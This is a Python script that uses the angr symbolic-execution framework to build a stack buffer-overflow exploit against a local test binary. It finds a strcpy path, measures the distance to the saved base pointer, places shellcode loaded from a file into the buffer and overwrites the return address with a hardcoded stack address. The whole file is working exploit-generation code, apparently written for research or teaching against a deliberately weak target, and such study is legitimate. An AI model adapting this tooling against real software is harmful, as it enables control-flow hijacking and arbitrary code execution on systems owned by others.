#!/usr/bin/env python3
import subprocess
import os
import logging
import sys
import angr
import claripy
import struct

target_addr = 0x7fffffffdda0

def load_shellcode(file_path):
    '''
    Load shellcode, if not found, it will run make on the directory containing
    the shellcode. Make will also build the target binary for testing.
    '''
    if not os.path.isfile(file_path):
        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
    file = open(file_path, 'rb')
    shellcode = file.read()
    print(shellcode)
    return shellcode

def scan_target(file_path):
    """
    Scans the target binary for memory vulnurabilites
    """
    logging.getLogger('angr.anager').setLevel(logging.CRITICAL)

    if not os.path.isfile(file_path):
        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
    project = angr.Project(file_path,\
            load_options={'auto_load_libs':False})
    print("Architecture: " + project.arch.name + " Starting at address:  " + hex(project.entry))
    print("Endianness: " + project.arch.memory_endness)

    assert project.loader.aslr == False, "ASLR is enabled, analysis is not possible"
    assert project.loader.main_object.execstack == True, "Stack is not executable"
    assert project.loader.main_object.pic == False, "Position Independant Code\
    enabled"

    entry_block = project.factory.block(project.entry)
    entry_block.pp()
    cfg = project.analyses.CFG()

    def get_func_addr( func_name, plt=None ):
        """
        Returns function address of a non stripped binary
        """
        found = [
            addr for addr,func in cfg.kb.functions.items()
            if func_name == func.name and (plt is None or func.is_plt == plt)
            ]
        if len( found ) > 0:
            print("Found "+func_name+"'s address at "+hex(found[0])+"!")
            return found[0]
        else:
            raise Exception("No address found for function : "+func_name)
    exit_addr = get_func_addr("exit")
    strcpy_addr = get_func_addr("strcpy")
    argv = [project.filename]

    sym_arg_size = 750

    sym_arg = claripy.BVS('sym_arg', 8 * sym_arg_size)
    argv.append(sym_arg)
    argv.append("Found the canary")

    state = project.factory.entry_state(args=argv)

    sm = project.factory.simulation_manager(state)

    def find_strcpy(state):
        """
        'Lambda' to simulation manager that returns true if the address of strcpy is found
        """
        if(state.ip.args[0] == strcpy_addr):
            print("Strcpy found during simulation!")
            bv_strcpy_mem = state.memory.load(state.regs.rsi, len(argv[1]))
            strcpy_src = state.solver.eval(bv_strcpy_mem, cast_to=bytes)
            return True if argv[2].encode() in strcpy_src else False
        else:
            return False

    sm = sm.explore(find=find_strcpy, avoid=(exit_addr,))
    found = sm.found
    result = ""
    if len(found) > 0:
        found = sm.found[0]
        print(found.solver.eval(sm.found[0].regs.rbp, cast_to=bytes))
        result = found.solver.eval(argv[1], cast_to=bytes)
    else:
        result = "ERROR: Could not find any paths!"
    buffer_size = found.solver.eval(found.regs.rbp - found.regs.rdi, cast_to=int)
    return (result, buffer_size)


def find_index_of_buffer(exploit_str, length):
    """
    Find index of first location in buffer that has a sequence of
    bytes with empty null characters of length
    """
    counter = 0
    ret_index = -1
    for (i, byte) in enumerate(exploit_str):
        if byte != 0x00:
            counter = 0
            continue
        if counter == 0:
            ret_index = i
        counter += 1
        if counter == length:
            return ret_index
    return -1



def append_shellcode(exploit_str):
    """
    Implants shellcode in a control-flow hijack ready payload
    """
    ret_str = bytearray() 
    shellcode = load_shellcode("../tests/resources/shellcode_encoding")
    index = find_index_of_buffer(exploit_str, len(shellcode))
    if index == -1:
        print("Error: Could not find space for shellcode!")
        sys.exit()
    count = 0
    for i in range(0, len(exploit_str)):
        if i > index and i < index + len(shellcode):
            ret_str.append(shellcode[count])
            count += 1
        else:
            ret_str.append(exploit_str[i])
    for (i, val) in enumerate(ret_str):
        if val == 0x00:
            ret_str[i] = 0x41
    print("Length of shellcode: " + str(len(shellcode)) + " at index: " + str(index))
    return (ret_str, index)

def inject_ret_addr(payload, distance_to_BP):
    """
    Takes in payload string with shellcode and distance to the stack base pointer
    from the buffer. 
    """
    print("Distance to base pointer from buffer is: " + str(distance_to_BP))
    distance_to_BP += 8 #RBP + 8 is Ret address
    encoded_addr = struct.pack("<Q", target_addr)
    final_payload = payload[0][:distance_to_BP] + encoded_addr + payload[0][distance_to_BP:]
    print(final_payload)
    return final_payload

    



def generate_exploit():
    control_flow_hijack_str = scan_target("../tests/resources/simple_buffer.o")
    payload_with_shellcode = append_shellcode(control_flow_hijack_str[0])
    final_payload = inject_ret_addr(payload_with_shellcode, control_flow_hijack_str[1])
    return final_payload


if __name__ == "__main__":
    payload = generate_exploit()